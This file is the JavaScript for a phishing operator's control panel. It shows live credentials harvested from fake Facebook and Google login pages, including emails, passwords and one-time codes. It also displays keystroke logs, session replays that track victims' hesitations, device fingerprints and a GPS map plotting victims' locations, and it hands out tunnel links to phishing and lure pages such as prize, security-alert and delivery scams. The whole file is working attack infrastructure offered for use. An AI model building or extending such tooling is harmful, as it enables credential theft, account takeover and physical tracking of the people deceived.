/**
 * Dashboard Script v4.0 — Enterprise Edition
 * Lucide Icons + Sidebar Navigation
 */

// ===== PAGE SWITCHING =====
let currentPage = 'overview';
let isTransitioning = false;

function switchPage(name, btn) {
    if (name === currentPage || isTransitioning) return;
    isTransitioning = true;

    const oldPage = document.getElementById('page-' + currentPage);
    const newPage = document.getElementById('page-' + name);

    // Update sidebar
    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');

    // Update topbar title
    const titles = {overview:'Dashboard',data:'Credentials',keylog:'Keystroke Logger',replay:'Session Replay',analytics:'GPS Location Map',links:'Phishing Links',guide:'Documentation'};
    document.getElementById('pageTitle').textContent = titles[name] || name;

    // Exit animation on old page
    if (oldPage) {
        oldPage.classList.remove('visible');
        oldPage.classList.add('exit');
    }

    // After exit, show new page
    setTimeout(() => {
        if (oldPage) { oldPage.classList.remove('active', 'exit'); }
        newPage.classList.add('active');
        // Force reflow then add visible
        void newPage.offsetHeight;
        requestAnimationFrame(() => {
            newPage.classList.add('visible');
            isTransitioning = false;
        });

        currentPage = name;
        if (name === 'keylog') loadKeylog();
        if (name === 'data') loadAllData();
        if (name === 'replay') loadReplay();
        if (name === 'analytics') loadAnalytics();
        if (window.innerWidth <= 900) { document.getElementById('sidebar').classList.remove('open'); document.getElementById('sidebarOverlay').classList.remove('open'); }
        setTimeout(() => lucide.createIcons(), 50);
    }, 200);
}

function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('open');
    document.getElementById('sidebarOverlay').classList.toggle('open');
}

// ===== WEBSOCKET =====
let ws = null, wsReconnectTimer = null, lastTotalCount = -1;

function connectWS() {
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    ws = new WebSocket(`${proto}://${location.host}`);
    ws.onopen = () => { setWsStatus('connected'); logTerminal('system', 'WebSocket connected — real-time mode active'); clearTimeout(wsReconnectTimer); };
    ws.onmessage = (e) => { try { handleWsMessage(JSON.parse(e.data)); } catch(err) {} };
    ws.onclose = () => { setWsStatus('error'); logTerminal('system', 'Disconnected — reconnecting in 5s...'); wsReconnectTimer = setTimeout(connectWS, 5000); };
    ws.onerror = () => setWsStatus('error');
}

function setWsStatus(state) {
    const dot = document.getElementById('wsDot'), txt = document.getElementById('wsStatus');
    if (!dot) return;
    dot.className = 'ws-dot ' + state;
    txt.textContent = state === 'connected' ? 'Live' : state === 'error' ? 'Reconnecting...' : 'Connecting...';
}

function handleWsMessage(msg) {
    switch (msg.type) {
        case 'tunnel': updateTunnelUI(msg.url, msg.status); break;
        case 'new_harvest':
            const h = msg.data;
            logTerminal('harvest', `CREDENTIALS: ${h.credentials?.email} / ${h.credentials?.password}${h.credentials?.otp ? ' | OTP: '+h.credentials.otp : ''}`);
            showToast('harvest', 'New Credentials', `${h.credentials?.email} — ${h.page_type}`);
            updateCountFromMsg('harvest');
            if (document.getElementById('page-data').classList.contains('active')) showNewDataBanner();
            break;
        case 'new_fingerprint':
            const fp = msg.data, dev = fp.device || {};
            logTerminal('visit', `VISIT: ${dev.device_name || 'Unknown'} | ${dev.os || ''} | ${fp.server_ip}`);
            showToast('visit', 'New Visitor', `${dev.device_name || 'Unknown'} — ${dev.browser || ''}`);
            updateCountFromMsg('fp');
            break;
        case 'keylog':
            const k = msg.data;
            logTerminal('keylog', `[${k.field}] "${k.current_value}" — ${k.session_id?.slice(0,12)}`);
            const kc = document.getElementById('keystrokeCount');
            if (kc) kc.textContent = parseInt(kc.textContent || 0) + 1;
            updateNavBadge('keylog', parseInt(kc?.textContent || 0));
            break;
        case 'session_event':
            logTerminal('replay', `Session ${msg.session_id?.slice(0,12)} — ${msg.events?.length || 0} events`);
            const rc = document.getElementById('replayCount');
            if (rc) rc.textContent = parseInt(rc.textContent || 0) + (msg.events?.length || 0);
            break;
        case 'data_cleared':
            logTerminal('system', 'All data cleared');
            loadAllData();
            break;
    }
}

// ===== TERMINAL =====
function logTerminal(type, msg) {
    const terminal = document.getElementById('liveTerminal');
    if (!terminal) return;
    const now = new Date().toLocaleTimeString('vi-VN', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const line = document.createElement('div');
    line.className = 'terminal-line';
    line.innerHTML = `<span class="terminal-time">${now}</span><span class="terminal-type ${type}">${type.toUpperCase()}</span><span class="terminal-msg">${esc(msg)}</span>`;
    terminal.appendChild(line);
    if (terminal.children.length > 60) terminal.removeChild(terminal.firstChild);
    terminal.scrollTop = terminal.scrollHeight;
}

// ===== TOAST =====
function showToast(type, title, msg) {
    const container = document.getElementById('toastContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `<div class="toast-icon"><i data-lucide="${type === 'harvest' ? 'fish' : 'eye'}"></i></div><div><div class="toast-title">${esc(title)}</div><div class="toast-msg">${esc(msg)}</div></div>`;
    container.appendChild(toast);
    lucide.createIcons({nodes: [toast]});
    setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(100%)'; toast.style.transition = 'all 0.3s'; setTimeout(() => toast.remove(), 300); }, 4000);
}

// ===== COUNTS =====
let harvestCount = 0, fpCount = 0;
function updateCountFromMsg(type) {
    if (type === 'harvest') { harvestCount++; document.getElementById('totalEntries').textContent = harvestCount; updateNavBadge('data', harvestCount); }
    if (type === 'fp') { fpCount++; document.getElementById('visitorCount').textContent = fpCount; }
}
function updateNavBadge(page, count) {
    const el = document.getElementById('navBadge' + page.charAt(0).toUpperCase() + page.slice(1));
    if (el) el.textContent = count;
}

// ===== TUNNEL =====
function updateTunnelUI(url, status) {
    const banner = document.getElementById('tunnelBanner'), statusEl = document.getElementById('tunnelStatus');
    if (!banner || !statusEl) return;
    if (url && status === 'connected') {
        banner.className = 'tunnel-banner connected';
        statusEl.innerHTML = `<i data-lucide="check-circle" style="width:18px;height:18px;color:var(--green)"></i><div><div style="color:var(--green);font-weight:600">Tunnel Connected</div><div class="tunnel-url">${url}</div></div>`;
        const links = {fbLink:`${url}/phishing/facebook.html`,ggLink:`${url}/phishing/google.html`,prizeLink:`${url}/landing/prize.html`,secLink:`${url}/landing/security.html`,delivLink:`${url}/landing/delivery.html`};
        Object.entries(links).forEach(([id,link]) => { const el = document.getElementById(id); if (el) el.textContent = link; });
        lucide.createIcons({nodes: [banner]});
    } else if (status === 'failed') {
        banner.className = 'tunnel-banner failed';
        statusEl.innerHTML = `<i data-lucide="x-circle" style="width:18px;height:18px;color:var(--red)"></i><div><div style="color:var(--red);font-weight:600">Tunnel Failed</div></div>`;
        lucide.createIcons({nodes: [banner]});
    }
}

function showNewDataBanner() {
    let banner = document.getElementById('newDataBanner');
    if (!banner) {
        banner = document.createElement('div'); banner.id = 'newDataBanner'; banner.className = 'new-data-banner';
        banner.onclick = () => { loadAllData(); banner.remove(); };
        document.getElementById('dataContainer').insertAdjacentElement('beforebegin', banner);
    }
    banner.innerHTML = 'New data available — <strong>Click to reload</strong>';
}

// ===== LOAD ALL DATA =====
async function loadAllData() {
    const banner = document.getElementById('newDataBanner'); if (banner) banner.remove();
    try {
        const [harvestRes, fpRes, keylogRes] = await Promise.all([
            fetch('/api/data').then(r => r.json()), fetch('/api/fingerprints').then(r => r.json()), fetch('/api/keylog').then(r => r.json())
        ]);
        harvestCount = harvestRes.total;

        // Dedup fingerprints theo session_id
        // Mỗi lần vào trang gửi 2 entries: nhanh (chưa có location) + đầy đủ (có location/social)
        // Chỉ giữ 1 entry tốt nhất mỗi session
        const rawFp = (fpRes.entries || []).filter(f => f.device && !f.update_type);
        const sessionMap = new Map();
        rawFp.forEach(fp => {
            const sid = fp.session_id || fp.received_at;
            const existing = sessionMap.get(sid);
            if (!existing) {
                sessionMap.set(sid, fp);
            } else {
                const newHasLoc = fp.location && fp.location.latitude;
                const oldHasLoc = existing.location && existing.location.latitude;
                const newHasSocial = fp.social_logins && Object.keys(fp.social_logins).length > 0;
                // Ưu tiên: có location > có social > mới hơn
                if (newHasLoc && !oldHasLoc) sessionMap.set(sid, fp);
                else if (!oldHasLoc && newHasSocial) sessionMap.set(sid, fp);
                else if (!oldHasLoc && new Date(fp.received_at) > new Date(existing.received_at)) sessionMap.set(sid, fp);
            }
        });
        const fpEntries = Array.from(sessionMap.values());

        fpCount = fpEntries.length;
        document.getElementById('totalEntries').textContent = harvestCount;
        document.getElementById('visitorCount').textContent = fpCount;
        document.getElementById('keystrokeCount').textContent = keylogRes.total_keystrokes;
        updateNavBadge('data', harvestCount);
        updateNavBadge('keylog', keylogRes.total_keystrokes);

        const items = [];
        fpEntries.forEach(fp => items.push({type:'visit',time:fp.received_at,page:fp.page_type||'unknown',ip:fp.server_ip||'N/A',device_name:fp.device?.device_name||'Unknown',device_type:fp.device?.device_type||'',os:(fp.device?.os||'')+' '+(fp.device?.os_version||''),browser:(fp.device?.browser||'')+' '+(fp.device?.browser_version||''),fp,email:null,password:null,fp_time:fp.received_at}));
        (harvestRes.entries || []).forEach(h => items.push({type:'harvest',time:h.timestamp,page:h.page_type||'unknown',ip:h.metadata?.ip||'N/A',device_name:h.metadata?.platform||'Unknown',device_type:'',os:h.metadata?.platform||'',browser:'',email:h.credentials?.email||'',password:h.credentials?.password||'',otp:h.credentials?.otp||null,fp:null,harvest_time:h.timestamp}));
        items.sort((a, b) => new Date(b.time) - new Date(a.time));

        const usedFp = new Set(), merged = [];
        items.forEach(item => {
            if (item.type === 'harvest') {
                const idx = items.findIndex((fp, i) => fp.type === 'visit' && !usedFp.has(i) && fp.ip === item.ip && Math.abs(new Date(fp.time) - new Date(item.time)) < 120000);
                if (idx >= 0) { usedFp.add(idx); item.fp = items[idx].fp; item.device_name = items[idx].device_name; item.os = items[idx].os; item.browser = items[idx].browser; item.device_type = items[idx].device_type; item.fp_time = items[idx].fp_time; }
                merged.push(item);
            } else if (!usedFp.has(items.indexOf(item))) { merged.push(item); }
        });

        let mobile = 0;
        merged.forEach(m => { if (/Điện thoại|iPhone|Android|Mobile/i.test(m.device_type || m.device_name || '')) mobile++; });
        document.getElementById('mobileCount').textContent = mobile;
        lastTotalCount = harvestCount + fpCount;

        const container = document.getElementById('dataContainer');
        if (!merged.length) { container.innerHTML = '<div class="empty-state">No data collected yet. Open phishing link on a phone to test.</div>'; return; }
        container.innerHTML = merged.map((item, idx) => renderEntry(item, idx)).join('');
        lucide.createIcons({nodes: [container]});
    } catch(err) { console.error(err); }
}

function renderEntry(item, idx) {
    const time = new Date(item.time).toLocaleString('vi-VN');
    const isHarvest = item.type === 'harvest';
    const pageLabel = {facebook:'Facebook',google:'Google',momo:'MoMo',zalo:'Zalo'}[item.page] || item.page;
    const pageIconName = {facebook:'log-in',google:'mail',momo:'wallet',zalo:'message-circle'}[item.page] || 'globe';
    const statusBadge = isHarvest ? '<span class="entry-badge harvest">Credentials</span>' : '<span class="entry-badge visit">Visit</span>';
    const delKey = encodeURIComponent(isHarvest ? item.harvest_time || item.time : item.fp_time || item.time);
    const delApi = isHarvest ? '/api/data/' : '/api/fingerprint/';

    let detailPanel = '';
    if (item.fp) {
        const fp = item.fp, dev = fp.device||{}, net = fp.network||{}, ctx = fp.context||{}, loc = fp.location||{}, bat = fp.battery||{}, social = fp.social_logins||{};
        const R = (icon,label,val) => `<div class="fp-row"><span class="fp-icon"><i data-lucide="${icon}" style="width:14px;height:14px"></i></span><div><div class="fp-label">${label}</div><div class="fp-value">${val}</div></div></div>`;
        let locHtml = loc.latitude ? `<div class="fp-row fp-row-wide"><span class="fp-icon"><i data-lucide="map-pin" style="width:14px;height:14px"></i></span><div><div class="fp-label">LOCATION ${loc.source==='GPS'?'(GPS)':'(IP)'}</div><div class="fp-value" style="color:var(--green)">${loc.latitude}, ${loc.longitude}</div><a href="${loc.google_maps}" target="_blank" class="fp-map-link"><i data-lucide="map" style="width:11px;height:11px;vertical-align:-2px"></i> Google Maps</a></div></div>` : '';
        const sk = Object.keys(social);
        const socialHtml = sk.map(n => { const s = social[n]; const st = s.likely_logged_in ? '<span style="color:var(--green)">Logged in</span>' : 'Unknown'; return R('user',n,st); }).join('');
        detailPanel = `<div class="detail-panel" id="detail-${idx}">
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r1">NETWORK</span> Connection</div><div class="fp-grid">${R('globe','IP',fp.server_ip||'N/A')}${R('wifi','Connection',net.type||'N/A')}${loc.isp?R('radio','ISP',loc.isp):''}${loc.city?R('building-2','Region',[loc.city,loc.region,loc.country].filter(Boolean).join(', ')):''}</div></div>
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r2">DEVICE</span> Information</div><div class="fp-grid">${R('smartphone','Device',esc(dev.device_name||'N/A'))}${R('monitor','OS',(dev.os||'')+' '+(dev.os_version||''))}${R('chrome','Browser',(dev.browser||'')+' v'+(dev.browser_version||''))}${R('maximize','Screen',(dev.screen_width||'?')+'x'+(dev.screen_height||'?'))}</div></div>
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r3">BEHAVIOR</span> Context</div><div class="fp-grid">${R('clock','Opened',ctx.local_time||time)}${R('link','Source',ctx.referrer_source||'Direct')}${R('battery-charging','Battery',(bat.level||'N/A')+' '+(bat.charging||''))}</div></div>
            ${locHtml ? `<div class="detail-section"><div class="detail-section-title"><span class="rank-badge r1">LOCATION</span></div><div class="fp-grid">${locHtml}</div></div>` : ''}
            ${socialHtml ? `<div class="detail-section"><div class="detail-section-title"><span class="rank-badge r4">ACCOUNTS</span></div><div class="fp-grid">${socialHtml}</div></div>` : ''}
        </div>`;
    }

    const otpHtml = item.otp ? `<div class="entry-cred"><span class="cred-label">OTP:</span> <span class="cred-val" style="color:var(--amber)">${esc(item.otp)}</span></div>` : '';

    return `<div class="data-entry ${isHarvest ? 'has-creds' : 'visit-only'}" id="entry-${idx}">
        <div class="entry-main" onclick="toggleDetail(${idx})">
            <div class="entry-left"><div class="entry-page"><i data-lucide="${pageIconName}" style="width:14px;height:14px;vertical-align:-2px;margin-right:4px"></i>${pageLabel}</div><div class="entry-time">${time}</div></div>
            <div class="entry-center">${isHarvest
                ? `<div class="entry-cred"><span class="cred-label">Email:</span> <span class="cred-val">${esc(item.email)}</span></div><div class="entry-cred"><span class="cred-label">Pass:</span> <span class="cred-val">${esc(item.password)}</span></div>${otpHtml}`
                : `<div class="entry-device">${esc(item.device_name)}</div><div class="entry-os">${item.os}</div>`}</div>
            <div class="entry-right">${statusBadge}<div class="entry-ip">${item.ip}</div><div class="entry-expand" id="arrow-${idx}">${item.fp ? '<i data-lucide="chevron-down" style="width:12px;height:12px"></i>' : ''}</div></div>
        </div>
        <div class="entry-actions"><button class="btn-delete-item" onclick="deleteItem('${delApi}','${delKey}',${idx})"><i data-lucide="trash-2" style="width:10px;height:10px;vertical-align:-1px"></i> Delete</button></div>
        ${detailPanel}
    </div>`;
}

function toggleDetail(idx) {
    const panel = document.getElementById('detail-' + idx), arrow = document.getElementById('arrow-' + idx);
    if (!panel) return;
    panel.classList.toggle('open');
    if (arrow) arrow.classList.toggle('rotated', panel.classList.contains('open'));
    if (panel.classList.contains('open')) lucide.createIcons({nodes: [panel]});
}

async function deleteItem(api, key, idx) {
    try {
        const r = await fetch(api + key, {method:'DELETE'}), d = await r.json();
        if (d.success) { const el = document.getElementById('entry-'+idx); if (el) { el.style.opacity='0'; el.style.transition='all 0.3s'; setTimeout(()=>el.remove(),300); } }
    } catch(e) { alert('Error deleting item'); }
}

// ===== KEYLOG =====
async function loadKeylog() {
    try {
        const data = await fetch('/api/keylog').then(r => r.json());
        document.getElementById('keystrokeCount').textContent = data.total_keystrokes;
        updateNavBadge('keylog', data.total_keystrokes);
        const container = document.getElementById('keylogContainer');
        if (!data.sessions.length) { container.innerHTML = '<div class="empty-state">No keystrokes recorded</div>'; return; }
        container.innerHTML = data.sessions.slice(0,20).map(session => {
            const fields = {};
            session.keystrokes.forEach(k => { if (!fields[k.field]) fields[k.field] = []; fields[k.field].push(k); });
            const fieldsHtml = Object.entries(fields).map(([field,keys]) => `<div style="margin-bottom:8px"><div class="keylog-field-label">${field}</div><div class="keylog-keys">${esc(keys[keys.length-1]?.value||'')}</div></div>`).join('');
            const time = new Date(session.start_time).toLocaleString('vi-VN');
            const icon = session.page_type==='facebook'?'log-in':'mail';
            return `<div class="keylog-session"><div class="keylog-session-header"><div><i data-lucide="${icon}" style="width:13px;height:13px;vertical-align:-2px"></i> <strong>${session.page_type==='facebook'?'Facebook':'Google'}</strong> · ${session.platform} · ${session.ip}</div><div>${time}</div></div>${fieldsHtml}</div>`;
        }).join('');
        lucide.createIcons({nodes: [container]});
    } catch(e) { console.error(e); }
}

// ===== SESSION REPLAY =====
async function loadReplay() {
    try {
        const data = await fetch('/api/session-replay').then(r => r.json());
        document.getElementById('replayCount').textContent = data.total;
        const container = document.getElementById('replayContainer');
        if (!data.sessions.length) { container.innerHTML = '<div class="empty-state">No session replay data yet</div>'; return; }
        container.innerHTML = data.sessions.slice(0,20).map(s => renderReplaySession(s)).join('');
        lucide.createIcons({nodes: [container]});
    } catch(e) { console.error(e); }
}

function renderReplaySession(session) {
    const events = session.events || [];
    const clicks = events.filter(e => e.type === 'click').length;
    const moves = events.filter(e => e.type === 'move' || e.type === 'touch').length;
    const scrolls = events.filter(e => e.type === 'scroll').length;
    const focuses = events.filter(e => e.type === 'focus').length;
    const duration = events.length > 1 ? Math.round((events[events.length-1].t - events[0].t) / 1000) : 0;
    const time = new Date(session.started_at).toLocaleString('vi-VN');
    const sid = session.session_id;
    const pageIconName = {facebook:'log-in',google:'mail'}[session.page_type] || 'globe';
    const hesitations = [];
    for (let i = 1; i < events.length; i++) { const gap = events[i].t - events[i-1].t; if (gap > 2000 && gap < 30000) hesitations.push({gap:Math.round(gap/1000),before:events[i-1].type}); }
    const behaviorItems = [
        {icon:'mouse-pointer',text:`${clicks} clicks, ${moves} mouse moves`},
        {icon:'arrow-down',text:`${scrolls} scrolls`},
        {icon:'text-cursor-input',text:`${focuses} input focus events`},
        {icon:'timer',text:`Time on page: ${duration}s`},
        ...hesitations.slice(0,2).map(h => ({icon:'pause',text:`Hesitated ${h.gap}s after ${h.before}`}))
    ];
    return `<div class="replay-session">
        <div class="replay-header" onclick="toggleReplayDetail('${sid}')">
            <div class="replay-info"><i data-lucide="${pageIconName}" style="width:18px;height:18px;color:var(--primary)"></i><div><div class="replay-page">${session.page_type} — ${session.ip}</div><div class="replay-meta">${time} · ${events.length} events</div></div></div>
            <div class="replay-stats">
                <div class="replay-stat"><div class="replay-stat-val">${duration}s</div><div class="replay-stat-label">Duration</div></div>
                <div class="replay-stat"><div class="replay-stat-val">${clicks}</div><div class="replay-stat-label">Clicks</div></div>
                <div class="replay-stat"><div class="replay-stat-val">${hesitations.length}</div><div class="replay-stat-label">Hesitations</div></div>
            </div>
        </div>
        <div class="heatmap-container" id="replay-detail-${sid}">
            <div style="font-size:12px;color:var(--text-dim);margin-bottom:10px;font-weight:600">Behavioral Analysis</div>
            <div class="behavior-timeline">${behaviorItems.map(b => `<div class="behavior-item"><span class="behavior-icon"><i data-lucide="${b.icon}" style="width:13px;height:13px"></i></span><span class="behavior-text">${esc(b.text)}</span></div>`).join('')}</div>
            <div style="margin-top:12px"><button class="replay-btn" onclick="deleteReplaySession('${sid}')"><i data-lucide="trash-2" style="width:11px;height:11px;vertical-align:-2px"></i> Delete session</button></div>
        </div>
    </div>`;
}

function toggleReplayDetail(sid) { const el = document.getElementById('replay-detail-' + sid); if (el) { el.classList.toggle('open'); if(el.classList.contains('open')) lucide.createIcons({nodes:[el]}); } }
async function deleteReplaySession(sid) { await fetch('/api/session-replay/' + sid, {method:'DELETE'}); loadReplay(); }

// ===== ANALYTICS / GPS MAP =====
let leafletMap = null;
let mapMarkers = [];

async function loadAnalytics() {
    try {
        const fpRes = await fetch('/api/fingerprints').then(r => r.json());
        const rawFp = (fpRes.entries || []).filter(f => f.device && !f.update_type);

        // Dedup theo session_id — giữ entry tốt nhất mỗi phiên
        const sessionMap = new Map();
        rawFp.forEach(fp => {
            const sid = fp.session_id || fp.received_at;
            const existing = sessionMap.get(sid);
            if (!existing) { sessionMap.set(sid, fp); return; }
            const newHasLoc = fp.location?.latitude;
            const oldHasLoc = existing.location?.latitude;
            if (newHasLoc && !oldHasLoc) sessionMap.set(sid, fp);
            else if (!oldHasLoc && fp.social_logins && Object.keys(fp.social_logins).length > 0) sessionMap.set(sid, fp);
        });
        const entries = Array.from(sessionMap.values());

        // Count stats
        let gpsCount = 0, ipCount = 0, noLoc = 0;
        const withLocation = [];

        entries.forEach(fp => {
            const loc = fp.location || {};
            if (loc.latitude && loc.source === 'GPS') { gpsCount++; withLocation.push(fp); }
            else if (loc.latitude && loc.source === 'IP') { ipCount++; withLocation.push(fp); }
            else { noLoc++; }
        });

        document.getElementById('anTotal').textContent = entries.length;
        document.getElementById('anGPS').textContent = gpsCount;
        document.getElementById('anIP').textContent = ipCount;
        document.getElementById('anNoLoc').textContent = noLoc;

        // Update sidebar badge
        const badge = document.getElementById('navBadgeAnalytics');
        if (badge) badge.textContent = withLocation.length;


        // Init Leaflet map (only once)
        if (!leafletMap) {
            leafletMap = L.map('analyticsMap', { zoomControl: true, attributionControl: false });
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                maxZoom: 19,
                attribution: '© OpenStreetMap'
            }).addTo(leafletMap);
            L.control.attribution({ prefix: false }).addTo(leafletMap);
        }

        // Clear old markers
        mapMarkers.forEach(m => leafletMap.removeLayer(m));
        mapMarkers = [];

        if (!withLocation.length) {
            // Default view: Vietnam
            leafletMap.setView([16.047, 108.206], 5);
            document.getElementById('locationList').innerHTML = '<div class="empty-state">Chưa có dữ liệu vị trí. Mở link phishing trên điện thoại và cho phép GPS.</div>';
            return;
        }

        // Add markers
        withLocation.forEach((fp, idx) => {
            const loc = fp.location;
            const dev = fp.device || {};
            const isGPS = loc.source === 'GPS';
            const color = isGPS ? '#059669' : '#2563eb';
            const accuracy = loc.accuracy || 'N/A';
            const time = new Date(fp.received_at).toLocaleString('vi-VN');
            const city = [loc.city, loc.region, loc.country].filter(Boolean).join(', ') || 'Không rõ';
            const isp = loc.isp || '';

            // Custom icon
            const icon = L.divIcon({
                className: '',
                html: `<div style="
                    width:14px;height:14px;border-radius:50%;
                    background:${color};border:2px solid #fff;
                    box-shadow:0 2px 8px rgba(0,0,0,.35),0 0 0 4px ${isGPS ? 'rgba(5,150,105,.25)' : 'rgba(37,99,235,.2)'};
                    transition:transform .2s;
                "></div>`,
                iconSize: [14, 14],
                iconAnchor: [7, 7],
                popupAnchor: [0, -10]
            });

            const popupHtml = `
                <div class="map-popup-title">${esc(dev.device_name || 'Unknown Device')}</div>
                <span class="map-popup-badge ${isGPS ? 'gps' : 'ip'}">${isGPS ? '📍 GPS Thật' : '🌐 Xấp xỉ IP'}</span>
                <div class="map-popup-row"><span class="map-popup-label">Tọa độ</span>${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}</div>
                <div class="map-popup-row"><span class="map-popup-label">Độ chính xác</span>${accuracy}</div>
                <div class="map-popup-row"><span class="map-popup-label">Vị trí</span>${esc(city)}</div>
                ${isp ? `<div class="map-popup-row"><span class="map-popup-label">ISP</span>${esc(isp)}</div>` : ''}
                <div class="map-popup-row"><span class="map-popup-label">OS</span>${esc((dev.os||'')+ ' ' +(dev.os_version||''))}</div>
                <div class="map-popup-row"><span class="map-popup-label">Thời gian</span>${time}</div>
                <a class="map-popup-link" href="${loc.google_maps}" target="_blank">🗺️ Mở Google Maps</a>
            `;

            const marker = L.marker([loc.latitude, loc.longitude], { icon })
                .bindPopup(popupHtml, { maxWidth: 260 })
                .addTo(leafletMap);

            mapMarkers.push(marker);
        });

        // Fit bounds to all markers
        if (mapMarkers.length === 1) {
            leafletMap.setView([withLocation[0].location.latitude, withLocation[0].location.longitude], 13);
        } else {
            const group = L.featureGroup(mapMarkers);
            leafletMap.fitBounds(group.getBounds().pad(0.2));
        }

        // Fix Leaflet tile loading after page switch
        setTimeout(() => leafletMap.invalidateSize(), 100);

        // Render location list
        const list = document.getElementById('locationList');
        list.innerHTML = withLocation.map((fp, idx) => {
            const loc = fp.location;
            const dev = fp.device || {};
            const isGPS = loc.source === 'GPS';
            const time = new Date(fp.received_at).toLocaleString('vi-VN');
            const city = [loc.city, loc.region, loc.country].filter(Boolean).join(', ') || 'Không rõ';
            return `<div class="loc-item ${isGPS ? 'gps-item' : 'ip-item'}" onclick="focusMarker(${idx})">
                <div class="loc-dot ${isGPS ? 'gps' : 'ip'}"></div>
                <div class="loc-info">
                    <div class="loc-coords">${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}</div>
                    <div class="loc-detail">${esc(dev.device_name||'Unknown')} • ${esc(city)}${loc.isp ? ' • ' + esc(loc.isp) : ''}</div>
                </div>
                <div class="loc-meta">
                    <div class="loc-source ${isGPS ? 'gps' : 'ip'}">${isGPS ? 'GPS' : 'IP'}</div>
                    <div class="loc-time">${time.split(',')[0]}</div>
                </div>
                <button class="loc-map-btn" onclick="event.stopPropagation();window.open('${loc.google_maps}','_blank')">Maps</button>
            </div>`;
        }).join('');

    } catch(e) { console.error(e); }
}

function focusMarker(idx) {
    if (!mapMarkers[idx] || !leafletMap) return;
    const marker = mapMarkers[idx];
    leafletMap.flyTo(marker.getLatLng(), 14, { animate: true, duration: 0.8 });
    setTimeout(() => marker.openPopup(), 900);
}

// ===== UTILS =====
function esc(str) { const d = document.createElement('div'); d.textContent = str || ''; return d.innerHTML; }
async function clearData() { if (!confirm('Clear all data?')) return; try { await fetch('/api/data', {method:'DELETE'}); lastTotalCount = -1; loadAllData(); } catch(e) { alert('Error'); } }
async function exportData() {
    try {
        const [h,f,r] = await Promise.all([fetch('/api/data').then(r=>r.json()),fetch('/api/fingerprints').then(r=>r.json()),fetch('/api/session-replay').then(r=>r.json())]);
        const blob = new Blob([JSON.stringify({harvest:h,fingerprints:f,session_replay:r},null,2)],{type:'application/json'});
        const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `research_lab_${new Date().toISOString().split('T')[0]}.json`; a.click();
    } catch(e) { alert('Error'); }
}
function copyLink(id) {
    const text = document.getElementById(id).textContent;
    navigator.clipboard.writeText(text).then(() => {
        const btn = event.target.closest('.btn-copy'); if (!btn) return;
        const o = btn.innerHTML; btn.innerHTML = '<i data-lucide="check" class="icon-btn"></i> Copied'; btn.style.background = 'var(--green)';
        lucide.createIcons({nodes:[btn]});
        setTimeout(() => { btn.innerHTML = o; btn.style.background = ''; lucide.createIcons({nodes:[btn]}); }, 1500);
    }).catch(() => { const el = document.createElement('textarea'); el.value = text; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); });
}

// ===== INIT =====
// Reveal initial page with animation
requestAnimationFrame(() => {
    const initialPage = document.getElementById('page-overview');
    if (initialPage) {
        void initialPage.offsetHeight;
        initialPage.classList.add('visible');
    }
});
loadAllData();
connectWS();
setInterval(async () => {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    try {
        const cnt = await fetch('/api/count').then(r => r.json());
        if (lastTotalCount !== -1 && cnt.total > lastTotalCount) showNewDataBanner();
        lastTotalCount = cnt.total;
        document.getElementById('totalEntries').textContent = cnt.harvest;
        document.getElementById('visitorCount').textContent = cnt.fp;
    } catch(e) {}
}, 8000);
